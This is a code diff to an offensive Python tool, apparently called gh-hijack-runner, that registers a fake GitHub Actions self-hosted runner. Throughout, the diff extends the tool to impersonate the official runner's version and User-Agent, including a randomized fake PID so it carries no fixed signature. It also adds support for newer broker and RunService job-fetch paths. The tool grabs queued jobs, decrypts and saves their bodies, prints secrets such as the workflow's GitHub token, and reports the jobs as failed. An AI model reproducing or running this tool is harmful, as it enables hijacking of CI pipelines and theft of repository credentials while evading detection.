@@ -16,6 +16,8 @@ Options:
     --runner-group <name>                   Runner group name
     --last-Message-id <id>                  Last message ID
     --sleep <seconds>                       Delay in second before returning an error
+    --runner-version <version>              GitHub runner version to impersonate (default: latest)
+    --no-fetch-version                      Do not query GitHub for the latest runner version
 
 Args:
     --registration-token <token>            Token used to register a runner
@@ -44,27 +46,58 @@ from Crypto.Util.number import long_to_bytes, inverse
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import PKCS1_OAEP, AES
 from Crypto.Hash import SHA256
+from Crypto.Signature import pkcs1_15
 import json
-from base64 import b64decode, b64encode, urlsafe_b64decode
+from base64 import b64decode, b64encode, urlsafe_b64decode, urlsafe_b64encode
 from binascii import hexlify
-import jwt
 import uuid
 from datetime import datetime, timedelta, timezone
 import time
+import random
 from os import makedirs
-from os.path import exists, isfile
+from os.path import isfile
 import sys
 
 requests.packages.urllib3.disable_warnings()
+
 GH_API_URL = "https://api.github.com"
 
-HEADERS = {
-    "User-Agent": "GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True CommitSHA/976290d966e6cc3e748a49bf8fdbe139ff764201",
+# Fallback used when the latest version cannot be fetched from GitHub.
+DEFAULT_RUNNER_VERSION = "2.320.0"
+# Not validated by GitHub; kept stable for a realistic User-Agent.
+RUNNER_COMMIT = "976290d966e6cc3e748a49bf8fdbe139ff764201"
+OS_DESCRIPTION = "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)"
+
+# Headers common to every request (the User-Agent is set per-runner-version).
+BASE_HEADERS = {
     "Content-Type": "application/json; charset=utf-8; api-version=6.0-preview.2",
-    "Accept": "application/json; api-version=6.0-preview.2"
+    "Accept": "application/json; api-version=6.0-preview.2",
 }
 
+# Default timeout for non long-polling requests, so we never hang forever.
+DEFAULT_TIMEOUT = 30
+
 VERBOSE = False
+
+
+def fetch_latest_runner_version(timeout=DEFAULT_TIMEOUT):
+    """Return the latest published actions/runner version (e.g. '2.327.0'), or None.
+
+    GitHub deprecates very old runner versions, so impersonating the current one
+    keeps registration working without manual bumps.
+    """
+    try:
+        res = requests.get(
+            f"{GH_API_URL}/repos/actions/runner/releases/latest",
+            headers={"Accept": "application/vnd.github+json", "User-Agent": "gh-hijack-runner"},
+            timeout=timeout,
+        )
+        res.raise_for_status()
+        return res.json()["tag_name"].lstrip("v")
+    except Exception as e:
+        print(f"[!] Could not fetch latest runner version ({e}), falling back to {DEFAULT_RUNNER_VERSION}.")
+        return None
+
 
 class Hijack:
 
@@ -81,6 +114,7 @@ class Hijack:
     runnerName = "runner"
     runnerGroupName = "Default"
     _runnerPoolId = None
+    _runnerId = None
     lastMessageId = 0
     _logToken = None
     _logUrl = None
@@ -91,11 +125,41 @@ class Hijack:
     labels = None
     ephemeral = False
     sleep = 0
+    runner_version = DEFAULT_RUNNER_VERSION
+    os_description = OS_DESCRIPTION
+    runner_commit = RUNNER_COMMIT
 
     def __init__(self):
         self._session = requests.Session()
-        self._session.headers.update(HEADERS)
+        self._session.headers.update(BASE_HEADERS)
         self._session.verify = False
+        # Fake, per-run identity for the message-polling User-Agent: a plausible
+        # PID (never our real one) and a fixed CreationTime, both stable for the
+        # life of this process so the header never changes between polls, like a
+        # real long-lived runner. Random per run so it is not a fixed signature.
+        self._fakePid = random.randint(2, 32768)
+        self._uaCreationTime = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%f").replace(":", "%3A") + "Z"
+        self._messageUA = None
+        self.set_runner_version(self.runner_version)
+
+    def set_runner_version(self, version):
+        """Update the impersonated runner version and rebuild the default User-Agent."""
+        self.runner_version = version
+        self._messageUA = None  # force the message User-Agent to be rebuilt
+        self._session.headers["User-Agent"] = (
+            f"GitHubActionsRunner-linux-x64/{self.runner_version} "
+            f"HttpProxyConfigured/True CommitSHA/{self.runner_commit}"
+        )
+
+    def _vs_user_agent(self, orchestration_id=None):
+        ua = (
+            f"VSServices/{self.runner_version}.0 (NetStandard; {self.os_description}) "
+            f"GitHubActionsRunner-linux-x64/{self.runner_version} HttpProxyConfigured/True "
+            f"ClientId/{self._clientId} GroupId/{self._runnerPoolId}"
+        )
+        if orchestration_id is not None:
+            ua += f" OrchestrationId/{orchestration_id}"
+        return ua + f" ({self.os_description})"
 
     def initRegistration(self):
         
@@ -122,8 +186,6 @@ class Hijack:
             rsa_params = json.load(f)
         rsa_params = {k: int(hexlify(b64decode(v)), 16) for k, v in rsa_params.items()}
         key = RSA.construct((rsa_params["modulus"], rsa_params["exponent"], rsa_params["d"], rsa_params["p"], rsa_params["q"]))
-
-        f.close()
 
         self._rsaKey = key
 
@@ -152,12 +214,8 @@ class Hijack:
             "poolId": self._runnerPoolId
         }
 
-        # Convert to JSON
-        json_runner = json.dumps(runner, indent=2)
-
         with open(self.runnerFile, "w") as f:
-            f.writelines(json_runner)
-        f.close()
+            f.write(json.dumps(runner, indent=2))
 
 
     def exportRSAKey(self):
@@ -173,12 +231,9 @@ class Hijack:
             "inverseQ": b64encode(long_to_bytes(inverse(self._rsaKey.q, self._rsaKey.p))).decode("utf-8")
         }
 
-        # Convert to JSON
-        json_rsa_components = json.dumps(rsa_components, indent=2)
-
         with open(self.rsaparamsFile, "w") as f:
-            f.writelines(json_rsa_components)
-        f.close()
+            f.write(json.dumps(rsa_components, indent=2))
+
     
     def exportCredentials(self):
 
@@ -191,12 +246,8 @@ class Hijack:
             }
         }
 
-        # Convert to JSON
-        json_credentials = json.dumps(credentials, indent=2)
-
         with open(self.credentialsFile, "w") as f:
-            f.writelines(json_credentials)
-        f.close()
+            f.write(json.dumps(credentials, indent=2))
 
     def exportComponents(self):
         self.exportCredentials()
@@ -217,13 +268,14 @@ class Hijack:
         
         self._session.headers.update({"Authorization": f"RemoteAuth {self.registrationToken}"})
 
-        res = self._session.post(f"{GH_API_URL}/actions/runner-registration", json=data)
+        res = self._session.post(f"{GH_API_URL}/actions/runner-registration", json=data, timeout=DEFAULT_TIMEOUT)
 
         if res.status_code == 200:
             url = res.json().get("url")
             token = res.json().get("token")
-            #print(f"[+] server url: {url}")
             return url, token
+        elif VERBOSE:
+            print(f"[!] runner-registration returned {res.status_code}: {res.text}")
         return None, None
     
     def getRunnerGroupsId(self, token):
@@ -234,7 +286,7 @@ class Hijack:
         }
 
         url = f"{self.serverUrl}_apis/distributedtask/pools?poolType=Automation"
-        res = self._session.get(url, headers=headers)
+        res = self._session.get(url, headers=headers, timeout=DEFAULT_TIMEOUT)
 
         if res.status_code == 200:
             for runnerGroup in res.json().get("value"):
@@ -288,8 +340,8 @@ class Hijack:
             },
             "id": 0,
             "name": self.runnerName,
-            "version": "2.320.0",
-            "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
+            "version": self.runner_version,
+            "osDescription": self.os_description,
             "ephemeral": self.ephemeral,
             "disableUpdate": False,
             "status": 0,
@@ -297,15 +349,13 @@ class Hijack:
         }
 
         if update:
-            res = self._session.put(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)
+            res = self._session.put(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data, timeout=DEFAULT_TIMEOUT)
         else:
-            res = self._session.post(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data)
+            res = self._session.post(f"{url}_apis/distributedtask/pools/{self._runnerPoolId}/agents", json=data, timeout=DEFAULT_TIMEOUT)
 
         if res.status_code == 200:
             self._authorizationUrl = res.json().get("authorization").get("authorizationUrl")
             self._clientId = res.json().get("authorization").get("clientId")
-            #print(f"[+] clientId: {self._clientId}")
-            #print(f"[+] authorizationUrl: {self._authorizationUrl}")
             return True
         elif res.status_code == 409:
             print(f"[+] error: {res.json().get('message')}")
@@ -313,18 +363,32 @@ class Hijack:
         return False
 
 
-    def getAccessToken(self):
+    def makeRS256JWT(self):
+        """Build an RS256 client-assertion JWT with pycryptodome.
 
-        jwtData = {
+        Avoids PyJWT's RS256, which needs the separate 'cryptography' backend.
+        """
+        def b64url(obj):
+            return urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=")
+
+        now = datetime.now(timezone.utc)
+        header = {"alg": "RS256", "typ": "JWT"}
+        payload = {
             "sub": self._clientId,
             "jti": str(uuid.uuid4()),
             "iss": self._clientId,
             "aud": self._authorizationUrl,
-            "exp": datetime.now(tz=timezone.utc) + timedelta(minutes=4),
-            "nbf": datetime.now(tz=timezone.utc)
+            "exp": int((now + timedelta(minutes=4)).timestamp()),
+            "nbf": int(now.timestamp()),
         }
 
-        runnerJWT = jwt.encode(jwtData, self._rsaKey.export_key(), algorithm="RS256")
+        signing_input = b64url(header) + b"." + b64url(payload)
+        signature = pkcs1_15.new(self._rsaKey).sign(SHA256.new(signing_input))
+        return (signing_input + b"." + urlsafe_b64encode(signature).rstrip(b"=")).decode()
+
+    def getAccessToken(self):
+
+        runnerJWT = self.makeRS256JWT()
 
         data = {
             "grant_type": "client_credentials",
@@ -336,7 +400,7 @@ class Hijack:
             "Accept": "application/json"
         }
 
-        res = requests.post(self._authorizationUrl, data=data, headers=headers, verify=False)
+        res = requests.post(self._authorizationUrl, data=data, headers=headers, verify=False, timeout=DEFAULT_TIMEOUT)
 
         if res.status_code == 200:
             self._accessToken = res.json().get("access_token")
@@ -359,7 +423,7 @@ class Hijack:
             "Accept": "application/json; api-version=6.0-preview.1"
         }
 
-        res = self._session.delete(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions/{sessionId}", headers=headers)
+        res = self._session.delete(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions/{sessionId}", headers=headers, timeout=DEFAULT_TIMEOUT)
         if res.status_code ==  202 or res.status_code == 200:
             print(f"[+] Session {sessionId} deleted.")
             return True
@@ -372,14 +436,16 @@ class Hijack:
         # === is because it's ok to have more padding
         data = json.loads(urlsafe_b64decode(self._accessToken.split(".")[1] + "==="))
 
+        self._runnerId = int(data.get("runner_id"))
+
         data = {
             "sessionId": "00000000-0000-0000-0000-000000000000",
             "ownerName": "6f67d7490611",
             "agent": {
-                "id": int(data.get("runner_id")),
+                "id": self._runnerId,
                 "name": data.get("runner_name"),
-                "version": "2.320.0",
-                "osDescription": "Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 (2024-02-04)",
+                "version": self.runner_version,
+                "osDescription": self.os_description,
                 "ephemeral": None,
                 "status": 0,
                 "provisioningState": None
@@ -389,7 +455,7 @@ class Hijack:
 
         self._session.headers.update({"Accept": "application/json; api-version=5.1-preview.1"})
 
-        res = self._session.post(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions", json=data)
+        res = self._session.post(f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/sessions", json=data, timeout=DEFAULT_TIMEOUT)
 
         if res.status_code == 200:
             self.sessionId = res.json().get("sessionId")
@@ -439,68 +505,110 @@ class Hijack:
     
     def getMessage(self):
 
-        self._session.headers.update({"User-Agent": "VSServices/2.320.0.0 (NetStandard; Linux 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 [2024-06-21]) GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True ClientId/87bedb90-e61c-4288-ae49-2188b3edcb56 RunnerId/31 GroupId/1 CommitSHA/78f21670b4a58aff19b5189207f54eb2bee324d1 Pid/91 CreationTime/2024-10-13T13%3A54%3A04.8769876Z (Runner) (Linux 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 [2024-06-21])"})
-        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion=2.320.0&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
+        # Build the polling User-Agent once and reuse it so Pid/CreationTime stay
+        # constant across the session (a real runner never changes them).
+        if self._messageUA is None:
+            self._messageUA = (
+                f"VSServices/{self.runner_version}.0 (NetStandard; {self.os_description}) "
+                f"GitHubActionsRunner-linux-x64/{self.runner_version} HttpProxyConfigured/True "
+                f"ClientId/{self._clientId} RunnerId/{self._runnerId or 1} GroupId/{self._runnerPoolId} "
+                f"CommitSHA/{self.runner_commit} Pid/{self._fakePid} CreationTime/{self._uaCreationTime} "
+                f"(Runner) ({self.os_description})"
+            )
+        self._session.headers["User-Agent"] = self._messageUA
+        url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages?sessionId={self.sessionId}&status=Online&runnerVersion={self.runner_version}&os=Linux&architecture=X64&disableUpdate=false&lastMessageId={self.lastMessageId}"
         res = self._session.get(url, timeout=60)
 
-        if res.status_code == 200:
-
-            if res.json().get("messageType", None) == "BrokerMigration":
-                brokerURL = json.loads(res.json().get("body")).get("brokerBaseUrl")
-                url = f"{brokerURL}/message?sessionId={self.sessionId}&status=Online&runnerVersion=2.320.0&os=Linux&architecture=X64&disableUpdate=false"
-                res = self._session.get(url, timeout=60)
-
-                if len(res.text) > 0:
-                    messageType = res.json().get("messageType")
-                    
-                    if messageType == "RunnerJobRequest":
-                        messageId = json.loads(res.json().get("body")).get("runner_request_id")
-                        url = f"{self.serverUrl}_apis/distributedtask/runnermessages/{messageId}"
-
-                        res = self._session.get(url, timeout=60)
-
-                        if len(res.text) > 0:
-                            self.handleClearMessage(res.json())
-                            return res.json()
-
-                else:
-                    return None
-
-            if res.json().get("messageType", None) != "PipelineAgentJobRequest":
-                return json.loads(res.json().get("body", {}))
-            
-            else:
-                messageId = res.json().get("messageId")
-
-                iv = b64decode(res.json().get("iv"))
-                body = b64decode(res.json().get("body"))
-                
-                decryptedBody = json.loads(self.decryptAES(iv, body))
-
-                self.handleClearMessage(decryptedBody)
-                return decryptedBody
-        
         if res.status_code == 403:
             print("[+] Error while getting messages got 403.")
-        
+            return None
+
+        if res.status_code != 200 or not res.text:
+            return None
+
+        message = res.json()
+
+        # A migrated runner is redirected to the broker; poll its /message queue
+        # once and dispatch whatever it returns (mirrors BrokerMessageListener).
+        if message.get("messageType") == "BrokerMigration":
+            brokerURL = json.loads(message.get("body")).get("brokerBaseUrl")
+            url = f"{brokerURL}/message?sessionId={self.sessionId}&status=Online&runnerVersion={self.runner_version}&os=Linux&architecture=X64&disableUpdate=false"
+            res = self._session.get(url, timeout=60)
+            if res.status_code != 200 or not res.text:
+                return None
+            message = res.json()
+
+        return self._dispatchMessage(message)
+
+    def _dispatchMessage(self, message):
+        """Turn a raw runner message into a job body, or None (mirrors Runner.cs)."""
+        messageType = message.get("messageType")
+        if VERBOSE:
+            print(f"[+] Received message type: {messageType}")
+
+        # Full job, AES-encrypted in the body (legacy HTTP queue and broker).
+        if messageType == "PipelineAgentJobRequest":
+            iv = b64decode(message.get("iv"))
+            body = b64decode(message.get("body"))
+            job = json.loads(self.decryptAES(iv, body))
+            self.handleClearMessage(job)
+            return job
+
+        # Body is a ref; the real job must be fetched from the runner/run service.
+        if messageType == "RunnerJobRequest":
+            job = self._fetchJobFromRef(json.loads(message.get("body")))
+            if job is None:
+                self.lastMessageId += 1  # consumed but unusable; advance so we don't spin
+            return job
+
+        # Control message (JobCancellation, ForceTokenRefresh, AgentRefresh, ...).
+        # Not a job even if it carries a jobId (e.g. JobCancellation): consume it
+        # so the pool cursor advances, then ignore it.
+        self.lastMessageId += 1
+        return None
+
+    def _fetchJobFromRef(self, ref):
+        """Fetch the AgentJobRequestMessage pointed to by a RunnerJobRequest ref."""
+        requestId = ref.get("runner_request_id")
+        runServiceUrl = ref.get("run_service_url")
+
+        if runServiceUrl:
+            # New RunService path: POST {runServiceUrl}/acquirejob
+            url = f"{runServiceUrl.rstrip('/')}/acquirejob"
+            payload = {"jobMessageId": requestId, "runnerOS": "linux"}
+            billingOwnerId = ref.get("billing_owner_id")
+            if billingOwnerId is not None:
+                payload["billingOwnerId"] = billingOwnerId
+            res = self._session.post(url, json=payload, timeout=60)
+        else:
+            # Legacy path.
+            url = f"{self.serverUrl}_apis/distributedtask/runnermessages/{requestId}"
+            res = self._session.get(url, timeout=60)
+
+        if res.status_code == 200 and res.text:
+            job = res.json()
+            self.handleClearMessage(job)
+            return job
+
+        if VERBOSE:
+            print(f"[+] Could not fetch job \'{requestId}\' (HTTP {res.status_code}): {res.text[:200]}")
         return None
 
     def deleteMesssageFromPool(self, messageId):
         url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/messages/{messageId}?sessionId={self.sessionId}"
-        self._session.delete(url)
+        self._session.delete(url, timeout=DEFAULT_TIMEOUT)
 
     def jobRequestPatch(self, body):
         requestId = int(body.get('requestId'))
         data = {"requestId":requestId,"data":{}}
         url = f"{self.serverUrl}_apis/distributedtask/pools/{self._runnerPoolId}/jobrequests/{requestId}?lockToken=00000000-0000-0000-0000-000000000000"
-        res = self._session.patch(url, json=data)
+        self._session.patch(url, json=data, timeout=DEFAULT_TIMEOUT)
 
 
     def returnTaskError(self, sessionRes, body):
 
-
-        start = datetime.utcnow()
-        stop = datetime.utcnow() + timedelta(seconds=4)
+        start = datetime.now(timezone.utc)
+        stop = start + timedelta(seconds=4)
 
         data = {
             "value": [
@@ -554,7 +662,7 @@ class Hijack:
         url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/timelines/{planId}/records"
 
         
-        res = sessionRes.patch(url, json=data)
+        sessionRes.patch(url, json=data, timeout=DEFAULT_TIMEOUT)
 
     def returnJobError(self, sessionRes, body):
 
@@ -573,7 +681,7 @@ class Hijack:
         planId = body.get('plan').get('planId')
         url = f"{self._logUrl}00000000-0000-0000-0000-000000000000/_apis/distributedtask/hubs/Actions/plans/{planId}/events"
         
-        res = sessionRes.post(url, json=data)
+        sessionRes.post(url, json=data, timeout=DEFAULT_TIMEOUT)
 
     def returnError(self, body):
         
@@ -582,7 +690,7 @@ class Hijack:
         orchestrationId = body.get('plan').get('planId')
         headers = {
             "Accept": "application/json; api-version=5.1-preview.1",
-            "User-Agent": f"VSServices/2.320.0.0 (NetStandard; Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04]) GitHubActionsRunner-linux-x64/2.320.0 HttpProxyConfigured/True ClientId/{self._clientId} GroupId/{self._runnerPoolId} OrchestrationId/{orchestrationId}.init.__default (Linux 6.6.15-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.6.15-2 [2024-02-04])"
+            "User-Agent": self._vs_user_agent(orchestration_id=f"{orchestrationId}.init.__default")
         }
 
         sessionRes.headers.update(headers)        
@@ -596,12 +704,11 @@ class Hijack:
     def saveBody(self, body):
 
         with open(f"{self.outputFolder}/{self.runnerName}-{self.lastMessageId}.json", "w") as f:
-            f.writelines(json.dumps(body))
-        f.close()
+            f.write(json.dumps(body))
 
     def renewAccessToken(self):
 
-        data = jwt.get_decoded_payload = jwt.decode(self._accessToken, options={"verify_signature": False})
+        data = json.loads(urlsafe_b64decode(self._accessToken.split(".")[1] + "==="))
         exp = datetime.fromtimestamp(int(data.get("exp")))
 
         if  datetime.now() > (exp + timedelta(minutes=5)):
@@ -609,7 +716,7 @@ class Hijack:
 
     def displayVariables(self, body):
 
-        variables = body.get("variables")
+        variables = body.get("variables") or {}
         for key in variables:
 
             if key == "system.github.token":
@@ -626,6 +733,17 @@ if __name__ == "__main__":
         VERBOSE = True
 
     hijack = Hijack()
+
+    # Resolve the runner version to impersonate. GitHub deprecates old runner
+    # versions, so by default we ask the API for the latest published one.
+    if args["--runner-version"]:
+        hijack.set_runner_version(args["--runner-version"])
+    elif not args["--no-fetch-version"]:
+        latest = fetch_latest_runner_version()
+        if latest:
+            hijack.set_runner_version(latest)
+            if VERBOSE:
+                print(f"[+] Impersonating runner version {latest}")
 
     if args["--rsa-params"]:
         hijack.rsaparamsFile = args["--rsa-params"]
@@ -692,6 +810,9 @@ if __name__ == "__main__":
     elif not hijack.initSession(args["--session-id"], args["--aes-key"]):
         sys.exit(1)
 
+    # Job body currently in flight (None when idle). Lets Ctrl+C fail the running
+    # job cleanly without ever referencing an undefined variable.
+    inflight = None
     while True:
         
         try:
@@ -700,6 +821,7 @@ if __name__ == "__main__":
             if body:
 
                 if body.get("jobId"):
+                    inflight = body
                     hijack.deleteMesssageFromPool(hijack.lastMessageId)
                     
                     hijack.displayVariables(body)
@@ -709,6 +831,7 @@ if __name__ == "__main__":
 
                     time.sleep(hijack.sleep)
                     hijack.returnError(body)
+                    inflight = None
 
                     if hijack.ephemeral:
                         sys.exit(0)
@@ -718,9 +841,8 @@ if __name__ == "__main__":
 
         except requests.exceptions.ReadTimeout as e:
             continue
-        except KeyboardInterrupt as e:
-            if body != None:
+        except KeyboardInterrupt:
+            if inflight is not None:
                 print("[+] Sending error to GitHub.")
-                hijack.returnError(body)
-            else:
-                sys.exit(1)
+                hijack.returnError(inflight)
+            sys.exit(1)
